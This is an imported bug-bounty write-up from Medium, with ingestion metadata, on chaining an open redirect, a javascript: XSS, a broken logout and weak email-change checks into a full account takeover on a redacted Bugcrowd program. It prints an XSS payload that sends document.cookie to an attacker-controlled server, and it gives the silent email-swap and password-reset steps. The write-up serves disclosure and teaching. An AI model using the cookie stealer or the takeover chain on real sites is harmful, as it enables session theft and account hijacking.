---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2021-05-24_chaining-xss-with-authentication-issues-to-turn-it-into-full-account-takeover.md
original_filename: 2021-05-24_chaining-xss-with-authentication-issues-to-turn-it-into-full-account-takeover.md
title: Chaining XSS with authentication issues to turn it into full account takeover
category: documents
detected_topics:
- xss
- command-injection
- path-traversal
- password-reset
tags:
- imported
- documents
- xss
- command-injection
- path-traversal
- password-reset
language: en
raw_sha256: eba73ece13e52c29c3662f5bbc8450701ea839b5ad2e7b48aaaa203ee3b31976
text_sha256: 18edfc557aaa027614f09d580f619460c3cea2ce9e0f139eb1569bb23e24468d
ingested_at: '2026-06-28T07:32:06Z'
sensitivity: unknown
redactions_applied: true
---

# Chaining XSS with authentication issues to turn it into full account takeover

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2021-05-24_chaining-xss-with-authentication-issues-to-turn-it-into-full-account-takeover.md
- Source Type: markdown
- Detected Topics: xss, command-injection, path-traversal, password-reset
- Ingested At: 2026-06-28T07:32:06Z
- Redactions Applied: True
- Raw SHA256: `eba73ece13e52c29c3662f5bbc8450701ea839b5ad2e7b48aaaa203ee3b31976`
- Text SHA256: `18edfc557aaa027614f09d580f619460c3cea2ce9e0f139eb1569bb23e24468d`


## Content

---
title: "Chaining XSS with authentication issues to turn it into full account takeover"
url: "https://n1ghtmar3.medium.com/chaining-xss-with-authentication-issues-to-turn-it-into-full-account-takeover-ae886ac696bb"
authors: ["N1GHTMAR3 (@n1ghtmar3_2421)"]
bugs: ["XSS", "Account takeover"]
publication_date: "2021-05-24"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 3625
scraped_via: "browseros"
---

# Chaining XSS with authentication issues to turn it into full account takeover

Chaining XSS with authentication issues to turn it into full account takeover
N1GHTMAR3
Follow
3 min read
·
May 25, 2021

137

In the name of Allah, i begin

Recently I started hunting on Bugcrowd. As a complete beginner on cyber security platform, I only looked for bugs only in subdomains and searched for only low hanging fruits. One of my friend suggested me [this video](https://www.youtube.com/watch?v=-PkK9DP5nec) by 
Sean (zseano)
 and told me to look for bugs in root domains rather than on subdomains. So I watched the video, took notes and started looking on a program on the BugCrowd and ended up getting a full account takeover bug.

(As this program doesn’t allow disclosure, let’s call it redacted.com)

I turned on my burp so I can see what is passing through in the http history tab. After creating an account and logging in, I saw in http history, a request was sent to `https://www.redacted.com/dashboard/?landingurl=redacted.com#/my-dashboard/authenticated?page=` which redirected to `https://www.redacted.com/#/my-dashboard/authenticated?page=` . After seeing this, I tried LFI methods after ‘page=’ param but it didn’t work. So I tried Open redirect after ‘landingurl=’ param and surprisingly I was redirected. Here is the payload that I tried `https://www.redacted.com/dashboard/?landingurl=evil.com#/my-dashboard/authenticated?page=` . But when I went to report it I saw open redirect was out of scope. :-(

So I tried for XSS with this payload javascript:alert(1) as it works on open redirect endpoints quite often. And when I tried this on the browser and BoOm!!! It got executed.

Press enter or click to view image in full size

So I took a note of it and started looking around to see what else I could find. After a while when I clicked on logout button,it took me to the https://www.redacted.com/shop/?error= page which looked odd to me as in most of the websites,after clicking log out, they will either take you to the https://www.redacted.com/ or https://www.redacted.com/login page. So I clicked on back button of the browser and I was in the dashboard again which means I was never logged out. :v I went to another page to check if only one page’s log out button was broken or on every page and surprisingly all were broken as well. But it was p4 as a user has to get his cookie to have persistence account. Then I remembered I already found a XSS. So immediately made a cookie stealer like this

'''

Get N1GHTMAR3’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

javascript:alert(1);var%20i%3Dnew%20Image%3Bi.src%3D%22https%3A%2F%2Fmy_server.com%2F%3F%22%2Bdocument.cookie%3B

'''

and BoOm! It worked and gave me the cookies.

Press enter or click to view image in full size

But the victim will still have his account access along with attacker. I wanted to find a way so that an attacker could take away full control from the victim. I tried to change the email but it asked for password=***REDACTED*** So no hope there.

Then I saw you could add secondary email there. So added my another email as secondary and no password was asked. And then made the secondary one, primary without password confirmation :v

So now victim’s email is secondary and attacker email is primary. I could delete the victim email without any problem and asked for password reset after that and the mail came to the attacker email. And I successfully changed the pass and Now I have full control of that account. And best part was between all these process like email adding,changing no email was sent to my first email aka victim’s email. So victim will have no idea of this attack as well.

Here XSS was only p3, session management was p4(in some programs they are out of scope), email transversal was p5 and open redirect was out of scope. But as zseano told in his video, I took notes of them and started chaining them together that made it simple p3 or p4 to p1.

[Here by victim email I meant my username@bugcrowdninja.com and attacker email meant username+1@bugcrowdninja.com]
